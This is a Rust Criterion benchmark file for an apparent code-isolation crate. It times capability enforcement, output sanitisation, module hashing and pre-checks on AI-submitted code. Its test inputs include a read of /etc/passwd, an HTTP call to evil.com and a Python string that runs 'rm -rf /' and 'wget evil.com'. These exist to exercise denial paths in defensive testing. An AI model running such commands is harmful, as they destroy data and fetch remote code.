//! Capability overhead and I/O throughput benchmarks.
//!
//! Run with: `cargo bench --package isolate-core --bench capability_io`

use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion};
use isolate_core::ai_exec::{
    CodeExecutor, CodeRequest, ExecutionProfile, Language, OutputSanitizer, SanitizeConfig,
};
use isolate_core::capability::{Capability, CapabilityEnforcer, CapabilitySet};
use isolate_core::config::ModuleHash;
use std::path::PathBuf;
use std::time::Duration;

const MINIMAL_WASM: &[u8] = include_bytes!("../tests/fixtures/minimal.wasm");

/// Benchmark capability enforcement overhead.
fn bench_capability_enforcement(c: &mut Criterion) {
    let mut group = c.benchmark_group("capability_enforcement");

    // Build a set with multiple capabilities
    let mut cap_set = CapabilitySet::new();
    cap_set.grant(Capability::stdout());
    cap_set.grant(Capability::stderr());
    cap_set.grant(Capability::filesystem_read("/data"));
    cap_set.grant(Capability::filesystem_read("/tmp"));
    cap_set.grant(Capability::http_client(vec!["api.example.com".to_string()]));
    cap_set.grant(Capability::system_clock());
    cap_set.grant(Capability::secure_random());

    let enforcer = CapabilityEnforcer::new(cap_set.clone(), uuid::Uuid::new_v4());

    group.bench_function("check_stdout", |b| b.iter(|| black_box(enforcer.check_stdout())));

    group.bench_function("check_fs_read_allowed", |b| {
        let path = PathBuf::from("/data/file.txt");
        b.iter(|| black_box(enforcer.check_fs_read(&path)))
    });

    group.bench_function("check_fs_read_denied", |b| {
        let path = PathBuf::from("/etc/passwd");
        b.iter(|| black_box(enforcer.check_fs_read(&path)))
    });

    group.bench_function("check_http_allowed", |b| {
        b.iter(|| black_box(enforcer.check_http("api.example.com")))
    });

    group.bench_function("check_http_denied", |b| {
        b.iter(|| black_box(enforcer.check_http("evil.com")))
    });

    group.finish();
}

/// Benchmark capability set operations.
fn bench_capability_set(c: &mut Criterion) {
    let mut group = c.benchmark_group("capability_set");

    for count in [1usize, 5, 10, 20] {
        group.bench_with_input(BenchmarkId::new("build_set", count), &count, |b, &n| {
            b.iter(|| {
                let mut set = CapabilitySet::new();
                for i in 0..n {
                    set.grant(Capability::filesystem_read(format!("/path/{}", i)));
                }
                black_box(set)
            })
        });
    }

    group.finish();
}

/// Benchmark output sanitization (simulating I/O processing).
fn bench_output_sanitization(c: &mut Criterion) {
    let mut group = c.benchmark_group("output_sanitization");

    let sanitizer = OutputSanitizer::new(SanitizeConfig::default());

    // Small output
    let small_output = b"Hello, world!\n".to_vec();
    group.bench_function("sanitize_small_14B", |b| {
        b.iter(|| black_box(sanitizer.sanitize(&small_output)))
    });

    // Medium output with ANSI codes
    let medium_output: Vec<u8> = (0..1000)
        .flat_map(|i| format!("\x1b[31mLine {}: Some output text here\x1b[0m\n", i).into_bytes())
        .collect();
    group.bench_function("sanitize_medium_with_ansi", |b| {
        b.iter(|| black_box(sanitizer.sanitize(&medium_output)))
    });

    // Large output
    let large_output: Vec<u8> = vec![b'A'; 1024 * 1024]; // 1MB
    group.bench_function("sanitize_large_1MB", |b| {
        b.iter(|| black_box(sanitizer.sanitize(&large_output)))
    });

    group.finish();
}

/// Benchmark AI code execution pre-checks.
fn bench_ai_pre_checks(c: &mut Criterion) {
    let mut group = c.benchmark_group("ai_pre_checks");

    let executor = CodeExecutor::new(ExecutionProfile::conservative());

    group.bench_function("simple_code", |b| {
        let req = CodeRequest::new("print('hello')", Language::Python);
        b.iter(|| black_box(executor.pre_check(&req)))
    });

    group.bench_function("suspicious_code", |b| {
        let req = CodeRequest::new(
            "import os\nos.system('rm -rf /')\nimport subprocess\nsubprocess.call(['wget', 'evil.com'])",
            Language::Python,
        );
        b.iter(|| black_box(executor.pre_check(&req)))
    });

    group.bench_function("language_detection", |b| {
        let sources = vec![
            "print('hello')",
            "console.log('hello')",
            "fn main() { println!(\"hello\"); }",
            "#include <stdio.h>\nint main() {}",
            "package main\nfunc main() {}",
        ];
        b.iter(|| {
            for source in &sources {
                black_box(isolate_core::ai_exec::Language::detect(source));
            }
        })
    });

    group.finish();
}

/// Benchmark module hashing at various sizes.
fn bench_module_hash_sizes(c: &mut Criterion) {
    let mut group = c.benchmark_group("module_hash_sizes");

    for size_kb in [1u64, 10, 100, 1000] {
        let data = vec![0x42u8; (size_kb * 1024) as usize];
        group.bench_with_input(
            BenchmarkId::new("sha256", format!("{}KB", size_kb)),
            &data,
            |b, data| b.iter(|| black_box(ModuleHash::from_bytes(data))),
        );
    }

    group.finish();
}

criterion_group!(
    benches,
    bench_capability_enforcement,
    bench_capability_set,
    bench_output_sanitization,
    bench_ai_pre_checks,
    bench_module_hash_sizes,
);

criterion_main!(benches);
